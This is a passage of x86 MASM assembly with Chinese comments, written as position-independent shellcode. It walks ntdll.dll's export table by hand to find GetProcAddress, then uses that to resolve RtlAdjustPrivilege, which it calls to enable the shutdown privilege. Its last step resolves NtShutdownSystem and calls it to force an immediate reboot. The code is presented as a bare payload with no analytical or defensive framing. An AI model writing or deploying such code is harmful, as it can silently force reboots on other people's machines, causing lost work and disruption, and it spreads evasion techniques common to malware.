
add ebx,offset ntdll ;

mov edi,ebx ;

push edi ;

call eax ;得到 ntdll.dll 的句柄 7c9200000 ;

pop edx ;导出函数名字符串地址表的(数组起始 RVA) ;

push eax ;

jmp a2 ;

;##########################################################装入 ntdll.dll####### ;

;##########################################################得到 GetProcAddress 的地址

GetProcAddress db "GetProcAddress",0 ;

a2:call @F ;

@@: ;

pop ebx ;

sub ebx,offset @B ;

add ebx,offset GetProcAddress ;

mov edi,ebx ;

mov ebx,edi ;

mov ecx,-1 ;表示最从大开始扫描 ;

xor al,al ;

cld ;

repnz scasb ;

mov ecx,edi ;

sub ecx,ebx ;得到字符串的长度包括 0 ;

sub edi,ecx ;要比较的字符串基地址 ;

xor eax,eax ;

.repeat ;

push esi ;

mov esi,\[edx\] ;

pop ebx ;

push ebx ;

add esi,ebx ;

sub esi,0F0h ;

push edi ;

push ecx ;

repz cmpsb ;

.if zero? ;

pop ecx ;

pop edi ;

pop esi ;

jmp @F ;

.endif ;

pop ecx ;

pop edi ;

pop esi ;

add edx,4 ;

inc eax ;

.until eax>=\[esi\].NumberOfNames ;

@@: ;

pop ebx ;得到 ntdll.dll 的句柄 ;

pop ecx ;得到导出表的地址 ;

push ebx ;得到 ntdll.dll 的句柄 ;

assume ecx:ptr IMAGE\_EXPORT\_DIRECTORY ;

sub edx, esi ;

add edx,0F0h ;

sub edx,\[ecx\].AddressOfNames ;

shr edx,1 ;进行除以 2 ;

add edx,\[ecx\].AddressOfNameOrdinals ;

add edx,esi ;

sub edx,0F0h ;

movzx eax,word ptr \[edx\] ;得到序号索引 ;

shl eax,2 ;

add eax,\[ecx\].AddressOfFunctions ;

add eax,esi ;

sub eax,0F0h ;

mov eax,dword ptr \[eax\] ;

add eax,esi ;

sub eax,0F0h ;得到 GetProcAddress 的地址 7c80ae30 ;

push eax ;

jmp a3 ;

;##########################################################得到 GetProcAddress 的地址

;##########################################################用 GetProcAddress 获取 ntdll.dll 模块内 RtlAdjustPrivilege 函数地址

RtlAdjustPrivilege db "RtlAdjustPrivilege",0 ;

a3:call @F ;

@@: ;

pop ebx ;

sub ebx,offset @B ;

add ebx,offset RtlAdjustPrivilege ;

mov edi,ebx ;

;

pop eax ;

pop ebx ;

push ebx ;

push eax ;

;

;

push edi ;

push ebx ;ntdll.dll 的模块基地址 ;

call eax ;GetProcAddress 的地址 ;

;##########################################################用 GetProcAddress 获取 ntdll.dll 模块内 RtlAdjustPrivilege 函数地址

push esp;得到 RtlAdjustPrivilege 的地址 7C949A4D

push 0

push 1

push 13h

call eax

jmp a4;

;##########################################################用 GetProcAddress 获取 ntdll.dll 模块内 NtShutdownSystem 函数地址

NtShutdownSystem db "NtShutdownSystem",0 ;

a4:call @F ;

@@: ;

pop ebx ;

sub ebx,offset @B ;

add ebx,offset NtShutdownSystem ;

mov edi,ebx ;

pop eax; ;

add eax,30h ;

pop ebx ;

push ebx ;

push eax ;

;

;

push edi ;

push ebx;ntdll.dll 的模块地址 ;

call eax;得到 NtShutdownSystem 的地址 ;

;##########################################################用 GetProcAddress 获取 ntdll.dll 模块内 NtShutdownSystem 函数地址

push 1;0 为关机,1 为重启

call eax

end start
